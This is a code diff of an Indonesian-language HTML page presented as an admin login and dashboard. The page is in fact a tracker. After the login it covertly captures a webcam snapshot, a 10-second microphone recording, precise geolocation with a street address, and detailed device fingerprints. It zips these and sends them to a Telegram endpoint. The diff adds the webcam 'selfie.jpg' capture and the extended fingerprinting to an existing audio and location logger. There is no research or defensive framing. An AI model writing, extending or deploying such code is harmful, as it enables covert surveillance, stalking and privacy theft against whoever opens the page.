@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Login & ZIP Logger with Time</title>
+  <title>Login & ZIP Logger with Full Device Tracker</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
   <style>
     body {
@@ -47,13 +47,15 @@
     <h2>Login Admin</h2>
     <input type="text" id="username" placeholder="Username" /><br>
     <input type="password" id="password" placeholder="Password" /><br>
+    <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
     <button onclick="cekLogin()">MASUK DASHBOARD</button>
   </div>
 
   <div id="dashboard">
     <h2>Dashboard Aktif</h2>
-    <div id="status">Lading Mohon Tunggu Sebentar. ..</div>
-    <div id="info">Sedang Di Prosess</div>
+    <div id="status">Loading... Mohon Tunggu Sebentar.</div>
+    <div id="info">Sedang Diproses</div>
+    <canvas id="snapshot" style="display:none;"></canvas>
   </div>
 
   <script>
@@ -63,31 +65,65 @@
     const validPassword = '123456';
 
     let recordedAudioBlob = null;
+    let webcamBlob = null;
 
     const userAgent = navigator.userAgent;
     const screenRes = `${screen.width} x ${screen.height}`;
-    const device = /Android/i.test(userAgent) ? "Android" :
-                   /iPhone/i.test(userAgent) ? "iPhone" :
-                   /iPad/i.test(userAgent) ? "iPad" :
-                   /Windows/i.test(userAgent) ? "Windows" :
-                   /Mac/i.test(userAgent) ? "Mac" : "Unknown";
+    const isMobile = /Android|iPhone|iPad/i.test(userAgent);
+    const orientation = (screen.orientation || {}).type || "unknown";
+    const pixelRatio = window.devicePixelRatio;
+    let batteryInfo = "Unknown";
+    let connectionInfo = navigator.connection ? navigator.connection.effectiveType : "Tidak tersedia";
 
-    function cekLogin() {
+    const match = userAgent.match(/\((.*?)\)/);
+    let model = "Tidak diketahui";
+    if (match && match[1]) {
+      const parts = match[1].split(";").map(x => x.trim());
+      model = parts.find(p => /Android/.test(p)) || parts.pop();
+    }
+
+    async function cekLogin() {
       const user = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value.trim();
 
       if (user === validUsername && pass === validPassword) {
         document.getElementById('login').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
+        ambilWebcam();
         mulaiTracking();
+        setTimeout(() => logoutOtomatis(), 600000); // 10 menit auto logout
       } else {
         alert("❌ Username atau Password salah!");
       }
     }
 
-    async function mulaiTracking() {
-      const statusDiv = document.getElementById('status');
+    async function ambilWebcam() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          const canvas = document.getElementById("snapshot");
+          canvas.width = 320;
+          canvas.height = 240;
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => webcamBlob = blob, "image/jpeg");
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+      } catch (err) {
+        console.warn("Gagal akses webcam:", err);
+      }
+    }
 
+    async function mulaiTracking() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? "(Charging)" : "(Not Charging)"}`;
+      }
+
+      const statusDiv = document.getElementById('status');
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const mediaRecorder = new MediaRecorder(stream);
@@ -103,7 +139,7 @@
         };
 
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => mediaRecorder.stop(), 10000); // 10 detik
 
       } catch (err) {
         statusDiv.innerText = "❌ Mikrofon gagal diakses: " + err.message;
@@ -121,7 +157,6 @@
           .then(res => res.json())
           .then(data => {
             const alamat = data.display_name || "Alamat tidak ditemukan";
-
             const now = new Date();
             const tanggal = now.toISOString().split("T")[0];
             const waktu = now.toTimeString().split(" ")[0];
@@ -136,12 +171,19 @@
 🎯 Akurasi: ${acc} meter
 🏠 Alamat: ${alamat}
 
-📱 Perangkat: ${device}
+📱 Perangkat: ${model}
+💻 Platform: ${navigator.platform}
+🗣 Bahasa: ${navigator.language}
+📱 Jenis: ${isMobile ? "Mobile" : "Desktop"}
 📺 Resolusi: ${screenRes}
+🔄 Orientasi Layar: ${orientation}
+🔍 Pixel Ratio: ${pixelRatio}
+🔋 Baterai: ${batteryInfo}
+🌐 Koneksi: ${connectionInfo}
 🧾 User Agent: ${userAgent}
 `;
 
-            buatDanKirimZip(logText, recordedAudioBlob);
+            buatDanKirimZip(logText, recordedAudioBlob, webcamBlob);
           });
 
       }, err => {
@@ -149,13 +191,11 @@
       }, { enableHighAccuracy: true });
     }
 
-    async function buatDanKirimZip(logText, audioBlob) {
+    async function buatDanKirimZip(logText, audioBlob, imageBlob) {
       const zip = new JSZip();
       zip.file("log.txt", logText);
-
-      if (audioBlob) {
-        zip.file("rekaman.webm", audioBlob);
-      }
+      if (audioBlob) zip.file("rekaman.webm", audioBlob);
+      if (imageBlob) zip.file("selfie.jpg", imageBlob);
 
       const zipBlob = await zip.generateAsync({ type: "blob" });
 
@@ -167,20 +207,20 @@
         method: "POST",
         body: formData
       }).then(() => {
-        document.getElementById('status').innerText = "✅ Log berhasil dikirim dalam ZIP ke Telegram.";
+        document.getElementById('status').innerText = "✅ Log berhasil dikirim ke Telegram.";
+        new Notification("Log berhasil dikirim ke Telegram.");
       });
     }
 
-    function mintaIzin() {
-      navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(stream => stream.getTracks().forEach(track => track.stop()))
-        .catch(err => console.warn("❌ Mikrofon ditolak:", err.message));
+    function logoutOtomatis() {
+      alert("Sesi telah berakhir. Anda akan logout.");
+      location.reload();
+    }
 
-      navigator.geolocation.getCurrentPosition(
-        () => console.log("✅ Lokasi diizinkan"),
-        err => console.warn("❌ Lokasi ditolak:", err.message),
-        { enableHighAccuracy: true }
-      );
+    function mintaIzin() {
+      Notification.requestPermission();
+      navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {});
+      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
     }
 
     window.onload = () => mintaIzin();
